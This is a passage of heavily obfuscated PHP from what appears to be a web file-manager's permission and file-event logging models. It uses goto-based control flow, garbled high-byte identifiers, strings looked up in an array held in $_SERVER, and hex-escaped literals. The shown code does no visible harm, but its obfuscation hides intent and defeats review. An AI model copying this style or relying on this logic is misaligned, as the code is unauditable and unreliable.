array($DùŒ±ÔôŠê[384], $c•ºÉÅ¹—œ)), $DùŒ±ÔôŠê[917] => $DùŒ±ÔôŠê[2197]); } if ($bØ£†„¥Ê¤) { $cè±¤É²â„ = array($cè±¤É²â„, $DùŒ±ÔôŠê[2256] => array($DùŒ±ÔôŠê[2286], $bØ£†„¥Ê¤)); } $f´¤ïß¤áù = $this->field($DùŒ±ÔôŠê[2287])->where($cè±¤É²â„)->select(); goto fÕÎ†ò±çï; d³ÔÜÀã’Š: return $F¿×•†°ö†; goto C‰õàì­¥; bÃä¸¾ø: foreach ($c®Œ‚‰Ä¸¨ as $AŒêÛ‚—«Í => $aßæœÍÛë–) { $EïŠÌ¼ †× = $b…ÅâŸóê[$AŒêÛ‚—«Í]; if (!$EïŠÌ¼ †× || !$Eôº¥”²·Õ[$EïŠÌ¼ †×]) { continue; } $DÖ¯Ö…ëë« = array(); foreach ($E¨õéœ¶ŠÂ[$EïŠÌ¼ †×] as $F®‘ó’¼¿) { $DÖ¯Ö…ëë«[] = $Eôº¥”²·Õ[$F®‘ó’¼¿]; } $c®Œ‚‰Ä¸¨[$AŒêÛ‚—«Í] = array_merge($DÖ¯Ö…ëë«, $aßæœÍÛë–); } $d¿²¹ÄîÙµ = array_values(array_unique($d¿²¹ÄîÙµ)); $F¿×•†°ö† = array($DùŒ±ÔôŠê[2279] => $d¿²¹ÄîÙµ, $DùŒ±ÔôŠê[2280] => $c®Œ‚‰Ä¸¨); goto d³ÔÜÀã’Š; c•ÑËÇ©: $DùŒ±ÔôŠê =& $_SERVER[´Ù×Íå‘ÄõÛ]; static $F¿×•†°ö† = false; if ($F¿×•†°ö†) { return $F¿×•†°ö†; } goto EŠè§ç—­ø; fÕÎ†ò±çï: $b¯Œ†åËíº = array_to_keyvalue($f´¤ïß¤áù, $DùŒ±ÔôŠê[33], $DùŒ±ÔôŠê[369]); $d¿²¹ÄîÙµ = array(); $F–Ÿ’ˆÇ©‹ = $c•ºÉÅ¹—œ; goto d ×­äáåã; D‰¯¡£“õ: if ($b¯Œ†åËíº) { $Aµ†È¾§’ = $aàÕÛ„‡¶¡->where(array($DùŒ±ÔôŠê[369] => array($DùŒ±ÔôŠê[384], $b¯Œ†åËíº)))->select(); foreach ($Aµ†È¾§’ as $BˆÖïâÖ­â) { $E“Ì¡ÂŠ¹É = $aàÕÛ„‡¶¡->parentLevelArray($BˆÖïâÖ­â[$DùŒ±ÔôŠê[461]]); $d¿²¹ÄîÙµ = array_merge($d¿²¹ÄîÙµ, $E“Ì¡ÂŠ¹É); $F–Ÿ’ˆÇ©‹[] = $BˆÖïâÖ­â[$DùŒ±ÔôŠê[458]]; $c®Œ‚‰Ä¸¨[$BˆÖïâÖ­â[$DùŒ±ÔôŠê[369]]] = $E“Ì¡ÂŠ¹É; $b…ÅâŸóê[$BˆÖïâÖ­â[$DùŒ±ÔôŠê[369]]] = $BˆÖïâÖ­â[$DùŒ±ÔôŠê[458]]; } } $F–Ÿ’ˆÇ©‹ = array_values(array_unique($F–Ÿ’ˆÇ©‹)); $AµĞ¿òÀ´² = $F–Ÿ’ˆÇ©‹; goto aìÓŠÏŠ¡î; d ×­äáåã: $aàÕÛ„‡¶¡ = Model($DùŒ±ÔôŠê[1121]); $DôŠ™½¾­ = Model($DùŒ±ÔôŠê[460]); $c®Œ‚‰Ä¸¨ = array(); goto DÛ‘»§“½; aìÓŠÏŠ¡î: foreach ($AµĞ¿òÀ´² as $F®‘ó’¼¿) { $a£ö•‡ ¦ = $DôŠ™½¾­->getInfo($F®‘ó’¼¿); $E“Ì¡ÂŠ¹É = $aàÕÛ„‡¶¡->parentLevelArray($a£ö•‡ ¦[$DùŒ±ÔôŠê[461]]); $F–Ÿ’ˆÇ©‹ = array_merge($F–Ÿ’ˆÇ©‹, $E“Ì¡ÂŠ¹É); } $F–Ÿ’ˆÇ©‹ = array_values(array_unique($F–Ÿ’ˆÇ©‹)); foreach ($F–Ÿ’ˆÇ©‹ as $F®‘ó’¼¿) { $a£ö•‡ ¦ = $DôŠ™½¾­->getInfo($F®‘ó’¼¿); $d¿²¹ÄîÙµ[] = $a£ö•‡ ¦[$DùŒ±ÔôŠê[391]][$DùŒ±ÔôŠê[369]]; $Eôº¥”²·Õ[$F®‘ó’¼¿] = $a£ö•‡ ¦[$DùŒ±ÔôŠê[391]][$DùŒ±ÔôŠê[369]]; $E¨õéœ¶ŠÂ[$F®‘ó’¼¿] = $aàÕÛ„‡¶¡->parentLevelArray($a£ö•‡ ¦[$DùŒ±ÔôŠê[461]]); } goto bÃä¸¾ø; d§ÏÔå‡µ: $c•ºÉÅ¹—œ = Session::get($DùŒ±ÔôŠê[2241]); $c•ºÉÅ¹—œ = array_to_keyvalue($c•ºÉÅ¹—œ, $DùŒ±ÔôŠê[33], $DùŒ±ÔôŠê[2112]); $cè±¤É²â„ = array($DùŒ±ÔôŠê[371] => SourceModel::TYPE_USER, $DùŒ±ÔôŠê[458] => USER_ID); goto c‰…Á—¶¼®; C‰õàì­¥: } private function makeSourceAuth($EìäÂùá“, $EÖñ¡³÷í) { goto e½‰Š¶ƒÆ; e½‰Š¶ƒÆ: $aéÍİŸ‡Ú =& $_SERVER[´Ù×Íå‘ÄõÛ]; $F¥çßÖ‘Ú´ = Session::get($aéÍİŸ‡Ú[2241]); $F¥çßÖ‘Ú´ = array_to_keyvalue($F¥çßÖ‘Ú´, $aéÍİŸ‡Ú[2112]); goto c‘éÃÃ·•›; c‘éÃÃ·•›: $Fô’ÃÍÁ = $aéÍİŸ‡Ú[83]; $Aœ—¼Ğ¼Ã = Model($aéÍİŸ‡Ú[1121])->parentLevelArray($EìäÂùá“[$aéÍİŸ‡Ú[461]]); $Aœ—¼Ğ¼Ã = array_merge(array($EìäÂùá“[$aéÍİŸ‡Ú[369]]), array_reverse($Aœ—¼Ğ¼Ã)); goto CßÇ¬±ã ¦; dçÎˆÃêï: if (!$B¶îŞ‡¢¢ && isset($F¥çßÖ‘Ú´[$D„„êÙ™Ÿô])) { $aÀ±·Ì¡ÕÛ = $F¥çßÖ‘Ú´[$D„„êÙ™Ÿô]; $f×Èâö¾« = Model($aéÍİŸ‡Ú[460])->getInfo($D„„êÙ™Ÿô); $B¶îŞ‡¢¢ = array($aéÍİŸ‡Ú[2288] => intval($aÀ±·Ì¡ÕÛ[$aéÍİŸ‡Ú[376]][$aéÍİŸ‡Ú[376]]), $aéÍİŸ‡Ú[2289] => $aÀ±·Ì¡ÕÛ[$aéÍİŸ‡Ú[376]], $aéÍİŸ‡Ú[2283] => array($aéÍİŸ‡Ú[388] => $aéÍİŸ‡Ú[2293], $aéÍİŸ‡Ú[75] => $f×Èâö¾«[$aéÍİŸ‡Ú[391]][$aéÍİŸ‡Ú[369]], $aéÍİŸ‡Ú[2292] => $f×Èâö¾«[$aéÍİŸ‡Ú[465]])); } if (!$B¶îŞ‡¢¢) { $f×Èâö¾« = Model($aéÍİŸ‡Ú[460])->getInfo($D„„êÙ™Ÿô); $FÎ„ª•—‡Ö = explode($aéÍİŸ‡Ú[47], trim($f×Èâö¾«[$aéÍİŸ‡Ú[461]], $aéÍİŸ‡Ú[47])); foreach ($FÎ„ª•—‡Ö as $a×¼àÙ¦ŒĞ) { if ($a×¼àÙ¦ŒĞ == $aéÍİŸ‡Ú[470] || $a×¼àÙ¦ŒĞ == $Fô’ÃÍÁ) { continue; } if (!isset($F¥çßÖ‘Ú´[$a×¼àÙ¦ŒĞ])) { continue; } $aÀ±·Ì¡ÕÛ = $F¥çßÖ‘Ú´[$a×¼àÙ¦ŒĞ]; $B¶îŞ‡¢¢ = array($aéÍİŸ‡Ú[2288] => intval($aÀ±·Ì¡ÕÛ[$aéÍİŸ‡Ú[376]][$aéÍİŸ‡Ú[376]]), $aéÍİŸ‡Ú[2289] => $aÀ±·Ì¡ÕÛ[$aéÍİŸ‡Ú[376]], $aéÍİŸ‡Ú[2283] => array($aéÍİŸ‡Ú[388] => $aéÍİŸ‡Ú[2290], $aéÍİŸ‡Ú[2291] => $f×Èâö¾«[$aéÍİŸ‡Ú[391]][$aéÍİŸ‡Ú[369]], $aéÍİŸ‡Ú[2292] => $f×Èâö¾«[$aéÍİŸ‡Ú[465]])); break; } } if (!$B¶îŞ‡¢¢ || $B¶îŞ‡¢¢[$aéÍİŸ‡Ú[377]] <= 0) { $EçƒÉ­ÖÒë = $this->authDeepCheck($EìäÂùá“[$aéÍİŸ‡Ú[369]]); if ($EçƒÉ­ÖÒë) { $B¶îŞ‡¢¢ = $EçƒÉ­ÖÒë; } } goto cÃæê³çä™; CßÇ¬±ã ¦: $D„„êÙ™Ÿô = $EìäÂùá“[$aéÍİŸ‡Ú[458]]; $dì‰³ë¨˜ = $EìäÂùá“[$aéÍİŸ‡Ú[371]] == SourceModel::TYPE_GROUP; if ($dì‰³ë¨˜ && isset($F¥çßÖ‘Ú´[$D„„êÙ™Ÿô]) && !_get($GLOBALS, $aéÍİŸ‡Ú[459])) { $aÀ±·Ì¡ÕÛ = $F¥çßÖ‘Ú´[$D„„êÙ™Ÿô]; if (Model($aéÍİŸ‡Ú[2275])->authCheckRoot($aÀ±·Ì¡ÕÛ[$aéÍİŸ‡Ú[376]][$aéÍİŸ‡Ú[376]])) { $f×Èâö¾« = Model($aéÍİŸ‡Ú[460])->getInfo($D„„êÙ™Ÿô); $B¶îŞ‡¢¢ = array($aéÍİŸ‡Ú[2288] => intval($aÀ±·Ì¡ÕÛ[$aéÍİŸ‡Ú[376]][$aéÍİŸ‡Ú[376]]), $aéÍİŸ‡Ú[2289] => $aÀ±·Ì¡ÕÛ[$aéÍİŸ‡Ú[376]], $aéÍİŸ‡Ú[2283] => array($aéÍİŸ‡Ú[388] => $aéÍİŸ‡Ú[2290], $aéÍİŸ‡Ú[2291] => $f×Èâö¾«[$aéÍİŸ‡Ú[391]][$aéÍİŸ‡Ú[369]], $aéÍİŸ‡Ú[2292] => $f×Èâö¾«[$aéÍİŸ‡Ú[465]])); return $B¶îŞ‡¢¢; } } goto eºš×Ç¶÷Í; cÃæê³çä™: return $B¶îŞ‡¢¢; goto cå‘Í±Ó‹Ô; eºš×Ç¶÷Í: $B¶îŞ‡¢¢ = !1; foreach ($Aœ—¼Ğ¼Ã as $dÏšº“»†í) { if (!isset($EÖñ¡³÷í[$dÏšº“»†í])) { continue; } $CÆÙŠ®Ì÷ = $this->authMake($EÖñ¡³÷í[$dÏšº“»†í]); if ($CÆÙŠ®Ì÷[$aéÍİŸ‡Ú[418]]) { $B¶îŞ‡¢¢ = $CÆÙŠ®Ì÷; break; } } if (!$dì‰³ë¨˜) { return $B¶îŞ‡¢¢; } goto dçÎˆÃêï; cå‘Í±Ó‹Ô: } public function authOwnerApply($FˆÂÀÓ›Í‘) { goto dÁÂèŞ•‹; dùìó³ÖÒ†: $EÛ«¸ù‚ë = array($aªóÚ£Ü[383] => array($aªóÚ£Ü[384], $A¬ªƒ®†ôÈ)); $b ÌŒĞ = $this->field($Bº´ƒ×†æ)->where($EÛ«¸ù‚ë)->select(); $b ÌŒĞ = array_to_keyvalue_group($b ÌŒĞ, $aªóÚ£Ü[369]); goto E£öÓ£‹Œ©; AĞ²Ààä³å: if (count($aô½´ùåÓ) == 0) { $aô½´ùåÓ = $this->authFolderOwnerGroup($FˆÂÀÓ›Í‘[$aªóÚ£Ü[458]]); } $aô½´ùåÓ = array_unique($aô½´ùåÓ); if (AuthModel::authCheckRoot($FˆÂÀÓ›Í‘[$aªóÚ£Ü[376]][$aªóÚ£Ü[377]])) { $aô½´ùåÓ[] = USER_ID; } goto B½Áí“Øíñ; E£öÓ£‹Œ©: $E­ø«”¶Ì• = array(); $aô½´ùåÓ = array(); foreach ($b ÌŒĞ as $AÖ¸¬Ó«Ø => $A—…ªˆßŒ¡) { $eÊÏäƒ–‘É = $this->authFolderOwnerUser($A—…ªˆßŒ¡); $E­ø«”¶Ì•[$AÖ¸¬Ó«Ø] = $eÊÏäƒ–‘É; $aô½´ùåÓ = array_merge($aô½´ùåÓ, $eÊÏäƒ–‘É[$aªóÚ£Ü[537]]); if ($eÊÏäƒ–‘É[$aªóÚ£Ü[2295]]) { break; } } goto AĞ²Ààä³å; dÁÂèŞ•‹: $aªóÚ£Ü =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (empty($FˆÂÀÓ›Í‘[$aªóÚ£Ü[376]]) || isset($FˆÂÀÓ›Í‘[$aªóÚ£Ü[2294]]) && $FˆÂÀÓ›Í‘[$aªóÚ£Ü[2294]]) { return $FˆÂÀÓ›Í‘; } if (AuthModel::authCheckRoot($FˆÂÀÓ›Í‘[$aªóÚ£Ü[376]][$aªóÚ£Ü[377]])) { return $FˆÂÀÓ›Í‘; } goto fï¢Ê°›Š; fï¢Ê°›Š: $A¬ªƒ®†ôÈ = Model($aªóÚ£Ü[1121])->parentLevelArray($FˆÂÀÓ›Í‘[$aªóÚ£Ü[461]]); $A¬ªƒ®†ôÈ = array_merge(array($FˆÂÀÓ›Í‘[$aªóÚ£Ü[369]]), array_reverse($A¬ªƒ®†ôÈ)); $Bº´ƒ×†æ = $aªóÚ£Ü[2278]; goto dùìó³ÖÒ†; B½Áí“Øíñ: $FˆÂÀÓ›Í‘[$aªóÚ£Ü[376]][$aªóÚ£Ü[2296]] = Model($aªóÚ£Ü[476])->userListInfo($aô½´ùåÓ); return $FˆÂÀÓ›Í‘; goto d²ÒÑİ´; d²ÒÑİ´: } private function authFolderOwnerGroup($cº³ƒíå¯) { $cµé–Ğ³ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $AÄÌØ¨™’ = Model($cµé–Ğ³[2191])->where(array($cµé–Ğ³[2112] => $cº³ƒíå¯))->select(); $Eõ¡àô‹è = array(); if (!$AÄÌØ¨™’) { return $Eõ¡àô‹è; } foreach ($AÄÌØ¨™’ as $EƒÍ—Š„¨) { $aê¨¦ç• = $this->authInfo($EƒÍ—Š„¨); if (AuthModel::authCheckRoot($aê¨¦ç•[$cµé–Ğ³[376]])) { $Eõ¡àô‹è[] = $EƒÍ—Š„¨[$cµé–Ğ³[1441]]; } } return $Eõ¡àô‹è; } private function authFolderOwnerUser($EŒä£¯ÑÚ‚) { $CÎÛÓ£Ò¨ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $fŒæº”áÕù = array(); $EÁªÁ‡âƒù = !1; foreach ($EŒä£¯ÑÚ‚ as $Cö•šÜë‘) { $f¡ò¼Å„´¦ = $this->authInfo($Cö•šÜë‘); if ($Cö•šÜë‘[$CÎÛÓ£Ò¨[458]] == $CÎÛÓ£Ò¨[470]) { $EÁªÁ‡âƒù = !0; } if ($Cö•šÜë‘[$CÎÛÓ£Ò¨[371]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($f¡ò¼Å„´¦[$CÎÛÓ£Ò¨[376]])) { $fŒæº”áÕù[] = $Cö•šÜë‘[$CÎÛÓ£Ò¨[458]]; } } } return array($CÎÛÓ£Ò¨[537] => $fŒæº”áÕù, $CÎÛÓ£Ò¨[2295] => $EÁªÁ‡âƒù); } public function authMake($B—ì…Œ÷ß˜) { goto f‰ƒœ‘µÂ¯; CŒš¤ÜÄ˜: $eÔ¤¨•¾¿‡ = 0; $dô”ø°òÂ = 0; $Fæ¡¸Å‡´ = 0; goto c¡ÃŠáéß; c¡ÃŠáéß: $eñÖÏ„–•ö = 0; $F§ªŒÊŠ = array($AæŸ òíÍŠ[369] => 0); foreach ($B—ì…Œ÷ß˜ as $F§ªŒÊŠ) { $c‹ÎÒ¶Ö© = $this->authInfo($F§ªŒÊŠ); $F„áÂ¡±á§ = $F§ªŒÊŠ[$AæŸ òíÍŠ[458]]; $fİÑâ˜Öô˜ = intval($c‹ÎÒ¶Ö©[$AæŸ òíÍŠ[376]]); if ($F§ªŒÊŠ[$AæŸ òíÍŠ[371]] == SourceModel::TYPE_USER && $F„áÂ¡±á§ == USER_ID) { $dô”ø°òÂ = !0; $A‚•Â™˜Çõ = $c‹ÎÒ¶Ö©; $e™ø‘·³ù = $fİÑâ˜Öô˜; } else { if ($F§ªŒÊŠ[$AæŸ òíÍŠ[371]] == SourceModel::TYPE_GROUP && in_array($F„áÂ¡±á§, $Aàãíº´’)) { $Fæ¡¸Å‡´ = !0; if ($fİÑâ˜Öô˜ >= $E¨Å†®Î‡) { $E¨Å†®Î‡ = $fİÑâ˜Öô˜; $B¾Ó¾¯¾Ö = $c‹ÎÒ¶Ö©; } } else { if ($F„áÂ¡±á§ == $AæŸ òíÍŠ[470]) { $eñÖÏ„–•ö = !0; $eÔ¤¨•¾¿‡ = $c‹ÎÒ¶Ö©; $Aï‚áÑ®È¬ = $fİÑâ˜Öô˜; } } } } goto bÄ…éó¡à; bÄ…éó¡à: $BæÊ¦ = $dô”ø°òÂ ? $e™ø‘·³ù : ($Fæ¡¸Å‡´ ? $E¨Å†®Î‡ : $Aï‚áÑ®È¬); $c‹ÎÒ¶Ö© = $dô”ø°òÂ ? $A‚•Â™˜Çõ : ($Fæ¡¸Å‡´ ? $B¾Ó¾¯¾Ö : $eÔ¤¨•¾¿‡); $f¡ŸãŠö‹ = $dô”ø°òÂ ? $AæŸ òíÍŠ[2297] : ($Fæ¡¸Å‡´ ? $AæŸ òíÍŠ[2298] : ($eñÖÏ„–•ö ? $AæŸ òíÍŠ[2299] : $AæŸ òíÍŠ[361])); goto bîÃ‰æÕÁİ; eòÍƒ»ÊŸĞ: $Aï‚áÑ®È¬ = 0; $A‚•Â™˜Çõ = 0; $B¾Ó¾¯¾Ö = 0; goto CŒš¤ÜÄ˜; bîÃ‰æÕÁİ: $FòÕ¹¦õ‚ = array($AæŸ òíÍŠ[2288] => intval($BæÊ¦), $AæŸ òíÍŠ[2289] => $c‹ÎÒ¶Ö©, $AæŸ òíÍŠ[2283] => array($AæŸ òíÍŠ[388] => $f¡ŸãŠö‹, $AæŸ òíÍŠ[75] => $F§ªŒÊŠ[$AæŸ òíÍŠ[369]])); return $FòÕ¹¦õ‚; goto fŠŒ‘Ê±·©; f‰ƒœ‘µÂ¯: $AæŸ òíÍŠ =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (!$B—ì…Œ÷ß˜) { return array($AæŸ òíÍŠ[377] => 0, $AæŸ òíÍŠ[418] => !1); } $e¦××ØÏ‘Î = Session::get($AæŸ òíÍŠ[2241]); goto A”ÚÅË”ğÍ; A”ÚÅË”ğÍ: $Aàãíº´’ = array_to_keyvalue($e¦××ØÏ‘Î, $AæŸ òíÍŠ[33], $AæŸ òíÍŠ[2112]); $e™ø‘·³ù = 0; $E¨Å†®Î‡ = 0; goto eòÍƒ»ÊŸĞ; fŠŒ‘Ê±·©: } public function authTargetInfoMake($E­öÏÖ¡Êè) { goto CÍœÇ“è¼ˆ; aÎã‹ÒÌÄê: return array($AÁƒÓ¨÷ë[2300] => $eÙ ×Õï, $AÁƒÓ¨÷ë[2292] => $eëØŠ†Œ™Ø); goto F…äìçÔù„; c¨Ë™Õ«¹: foreach ($E­öÏÖ¡Êè as $fåğá”ñ¾„) { if ($fåğá”ñ¾„[$AÁƒÓ¨÷ë[371]] == SourceModel::TYPE_USER) { $eÙ ×Õï[] = intval($fåğá”ñ¾„[$AÁƒÓ¨÷ë[458]]); } else { if ($fåğá”ñ¾„[$AÁƒÓ¨÷ë[371]] == SourceModel::TYPE_GROUP) { $eëØŠ†Œ™Ø[] = intval($fåğá”ñ¾„[$AÁƒÓ¨÷ë[458]]); } } } if ($eÙ ×Õï) { $eÙ ×Õï = Model($AÁƒÓ¨÷ë[476])->userListInfo($eÙ ×Õï); } if ($eëØŠ†Œ™Ø) { $dİŸ„Šßë‚ = array($AÁƒÓ¨÷ë[2189] => array($AÁƒÓ¨÷ë[384], $eëØŠ†Œ™Ø)); $eëØŠ†Œ™Ø = Model($AÁƒÓ¨÷ë[460])->field($AÁƒÓ¨÷ë[2202])->where($dİŸ„Šßë‚)->select(); $eëØŠ†Œ™Ø = array_to_keyvalue($eëØŠ†Œ™Ø, $AÁƒÓ¨÷ë[2112]); } goto aÎã‹ÒÌÄê; CÍœÇ“è¼ˆ: $AÁƒÓ¨÷ë =& $_SERVER[´Ù×Íå‘ÄõÛ]; $eÙ ×Õï = array(); $eëØŠ†Œ™Ø = array(); goto c¨Ë™Õ«¹; F…äìçÔù„: } public function authInfo($d±çæøíº‹) { $aË°æø”· =& $_SERVER[´Ù×Íå‘ÄõÛ]; if ($d±çæøíº‹[$aË°æø”·[2256]]) { $FÎôò„´åŞ = Model($aË°æø”·[2275])->listData($d±çæøíº‹[$aË°æø”·[2256]]); if (!$FÎôò„´åŞ) { return !1; $bí„õÊ½ = Model($aË°æø”·[2275])->listData(); $D¬Ç»«¾¾ƒ = array_filter_by_field($bí„õÊ½, $aË°æø”·[376], $aË°æø”·[470]); return $D¬Ç»«¾¾ƒ; } $bÌÂ‡ğì©¾ = array_field_key($FÎôò„´åŞ, array($aË°æø”·[367], $aË°æø”·[28], $aË°æø”·[376], $aË°æø”·[2130], $aË°æø”·[2133])); $bÌÂ‡ğì©¾[$aË°æø”·[2301]] = $d±çæøíº‹; return $bÌÂ‡ğì©¾; } else { return array($aË°æø”·[385] => 0, $aË°æø”·[2118] => $d±çæøíº‹[$aË°æø”·[2257]], $aË°æø”·[386] => $aË°æø”·[33], $aË°æø”·[2130] => $aË°æø”·[2302]); } } } class SourceEventModel extends ModelBase { protected $tableName = "\x69\157\137\163\x6f\165\162\x63\x65\137\x65\x76\x65\x6e\x74"; protected $dataAuto = array(array("\143\x72\145\x61\x74\145\124\x69\155\x65", "\x74\x69\x6d\x65", "\151\156\163\145\x72\164", "\x66\165\156\x63\164\x69\157\156"), array("\144\145\x73\x63", '', "\x69\x6e\163\145\162\164\54\x75\x70\144\141\164\x65\x2c\163\x65\154\145\x63\164", "\152\x73\x6f\x6e")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($fÑšÄŞåÜ·, $Eõœ¬ËĞ¥â, $eãĞÔŸ‹ãõ = '') { goto dôŸó»ã×·; dôŸó»ã×·: $aİ—¸÷âÉ¡ =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (!$this->eventSave) { return; } $fÏˆö‘ï‚ = Model($aİ—¸÷âÉ¡[1121])->sourceInfo($fÑšÄŞåÜ·); goto c°˜æÖòé; a®µğ÷§Éà: $FĞùæìÜÇ = array($aİ—¸÷âÉ¡[383] => $fÑšÄŞåÜ·, $aİ—¸÷âÉ¡[2303] => $fÏˆö‘ï‚[$aİ—¸÷âÉ¡[463]], $aİ—¸÷âÉ¡[2304] => $fÏˆö‘ï‚[$aİ—¸÷âÉ¡[28]], $aİ—¸÷âÉ¡[468] => $fÏˆö‘ï‚[$aİ—¸÷âÉ¡[468]], $aİ—¸÷âÉ¡[1432] => USER_ID, $aİ—¸÷âÉ¡[388] => $Eõœ¬ËĞ¥â, $aİ—¸÷âÉ¡[1434] => $eãĞÔŸ‹ãõ); $this->addSystemLog($Eõœ¬ËĞ¥â, $FĞùæìÜÇ); return $this->add($FĞùæìÜÇ); goto CÁ†¹¡Ğ; c°˜æÖòé: if (!$fÏˆö‘ï‚) { return !1; } if ($this->isCacheEvent($fÏˆö‘ï‚, $Eõœ¬ËĞ¥â)) { return; } if ($eãĞÔŸ‹ãõ && is_string($eãĞÔŸ‹ãõ)) { $eãĞÔŸ‹ãõ = array($aİ—¸÷âÉ¡[2142] => $eãĞÔŸ‹ãõ); } goto a®µğ÷§Éà; CÁ†¹¡Ğ: } private function addSystemLog($aĞñ¸•µ‰ğ, $aô­Ğ‚–ª¨) { $CèªØ°»— =& $_SERVER[´Ù×Íå‘ÄõÛ]; if ($aĞñ¸•µ‰ğ == $CèªØ°»—[2305]) { $aĞñ¸•µ‰ğ = $aô­Ğ‚–ª¨[$CèªØ°»—[405]][$CèªØ°»—[2306]]; } else { if (in_array($aĞñ¸•µ‰ğ, array($CèªØ°»—[2089], $CèªØ°»—[2307]))) { $aĞñ¸•µ‰ğ = $aô­Ğ‚–ª¨[$CèªØ°»—[405]][$CèªØ°»—[693]]; } } $FÈİ•‡è™ = array_merge($aô­Ğ‚–ª¨, array($CèªØ°»—[2308] => $aô­Ğ‚–ª¨[$CèªØ°»—[369]], $CèªØ°»—[2309] => $aô­Ğ‚–ª¨[$CèªØ°»—[2309]])); Model($CèªØ°»—[2052])->addLog($CèªØ°»—[2310] . $aĞñ¸•µ‰ğ, $FÈİ•‡è™); } private function isCacheEvent($CƒÏ¬¾±Ä, $dˆ÷Ÿš…¼²) { if ($CƒÏ¬¾±Ä[$_SERVER[´Ù×Íå‘ÄõÛ][371]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($d´Íçæğ§Ö, $aèÄ‡éœ) { $bÁÇÕ«±‘³ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $aœ‹×°ÇÅ† = Model($bÁÇÕ«±‘³[1121])->sourceInfo($d´Íçæğ§Ö); $BËù‡§‹ï‹ = array($bÁÇÕ«±‘³[2306] => $aèÄ‡éœ, $bÁÇÕ«±‘³[28] => $aœ‹×°ÇÅ†[$bÁÇÕ«±‘³[28]]); return $this->addEvent($d´Íçæğ§Ö, $bÁÇÕ«±‘³[2305], $BËù‡§‹ï‹); } public function eventFileEdit($Eëøø©š™) { $c¸ÁÄ¿Ïƒ¾ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $aÚœÀ›‡È¾ = array($c¸ÁÄ¿Ïƒ¾[2311] => $_SERVER[$c¸ÁÄ¿Ïƒ¾[2312]], $c¸ÁÄ¿Ïƒ¾[1756] => strtolower(ACTION)); return $this->addEvent($Eëøø©š™, $c¸ÁÄ¿Ïƒ¾[2079], $aÚœÀ›‡È¾); } public function eventRecycle($EÃËºâæ»Š, $b½İô†Œš·) { return $this->addEvent($EÃËºâæ»Š, $_SERVER[´Ù×Íå‘ÄõÛ][2307], $b½İô†Œš·); } public function eventRemove($E­»²‚¶áô) { $AôÉ™µÒ¿ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $a»¶Š‰¦± = Model($AôÉ™µÒ¿[1121])->sourceInfo($E­»²‚¶áô); $dĞ®´±æµÕ = $a»¶Š‰¦±[$AôÉ™µÒ¿[28]]; return $this->addEvent($a»¶Š‰¦±[$AôÉ™µÒ¿[463]], $AôÉ™µÒ¿[2078], $dĞ®´±æµÕ); } public function eventShare($Dì¹ó¼æ²Î, $BØÎíåĞˆ„) { return $this->addEvent($Dì¹ó¼æ²Î, $_SERVER[´Ù×Íå‘ÄõÛ][2089], $BØÎíåĞˆ„); } public function eventMove($Cš¥‰ßÄ¸Ë, $bˆ•î¤ùÁˆ, $bˆ²‘ë‰‡“) { goto a˜ø¶‚ÉÆ; DŠ˜ê’Š§Å: $this->addEvent($bˆ•î¤ùÁˆ, $C•ã„Ï”†[2317], $BÑã¢·ìˆ’); goto cæ…Óç»²ò; a˜ø¶‚ÉÆ: $C•ã„Ï”† =& $_SERVER[´Ù×Íå‘ÄõÛ]; $E½®ö©…¯£ = Model($C•ã„Ï”†[1121]); $C ŸÓ‹áİ  = $E½®ö©…¯£->sourceInfo($Cš¥‰ßÄ¸Ë); goto E‡ì•µ‡’; BÊ†ĞŠ®­¯: $this->addEvent($Cš¥‰ßÄ¸Ë, $C•ã„Ï”†[494], $BÑã¢·ìˆ’); $C ŸÓ‹áİ  = $E½®ö©…¯£->sourceInfo($Cš¥‰ßÄ¸Ë); $BÑã¢·ìˆ’ = array($C•ã„Ï”†[369] => $C ŸÓ‹áİ [$C•ã„Ï”†[369]], $C•ã„Ï”†[28] => $C ŸÓ‹áİ [$C•ã„Ï”†[28]]); goto DŠ˜ê’Š§Å; E‡ì•µ‡’: $eƒòˆ®ŒÍš = $E½®ö©…¯£->sourceInfo($bˆ•î¤ùÁˆ); $B¹„à »Ó = $E½®ö©…¯£->sourceInfo($bˆ²‘ë‰‡“); $BÑã¢·ìˆ’ = array($C•ã„Ï”†[1011] => $bˆ•î¤ùÁˆ, $C•ã„Ï”†[2313] => $eƒòˆ®ŒÍš[$C•ã„Ï”†[28]], $C•ã„Ï”†[2314] => $eƒòˆ®ŒÍš[$C•ã„Ï”†[468]], $C•ã„Ï”†[1012] => $bˆ²‘ë‰‡“, $C•ã„Ï”†[2315] => $B¹„à »Ó[$C•ã„Ï”†[28]], $C•ã„Ï”†[2316] => $B¹„à »Ó[$C•ã„Ï”†[468]]); goto BÊ†ĞŠ®­¯; cæ…Óç»²ò: } public function eventCopy($bœ¤Á˜ßİå) { $this->eventCreate($bœ¤Á˜ßİå, $_SERVER[´Ù×Íå‘ÄõÛ][492]); } public function eventRename($AË–å‡¤Í, $b‹ÛÁù’îŠ, $aÀê¹ÖÕà) { $f¯ô¦›Ï‚Î =& $_SERVER[´Ù×Íå‘ÄõÛ]; $EÈ³•œ²‹ = array($f¯ô¦›Ï‚Î[1011] => $b‹ÛÁù’îŠ, $f¯ô¦›Ï‚Î[1012] => $aÀê¹ÖÕà); return $this->addEvent($AË–å‡¤Í, $f¯ô¦›Ï‚Î[1134], $EÈ³•œ²‹); } public function eventAddComment($bå©øÂøâ­, $cÍˆ¿Îé£Û) { return $this->addEvent($bå©øÂøâ­, $_SERVER[´Ù×Íå‘ÄõÛ][2318], $cÍˆ¿Îé£Û); } public function eventAddDesc($Fø¡³Ã¿ÂĞ, $f„¹±ÚÎ) { return $this->addEvent($Fø¡³Ã¿ÂĞ, $_SERVER[´Ù×Íå‘ÄõÛ][2319], $f„¹±ÚÎ); } public function listBySource($e¹Û‡°‰õè) { goto f§¿É”ËÏ; F±ñÆÎ˜ë½: if ($Cª¢ï‚Ú¼ó[$B½îÀ¢ø¸[370]] == $B½îÀ¢ø¸[83]) { 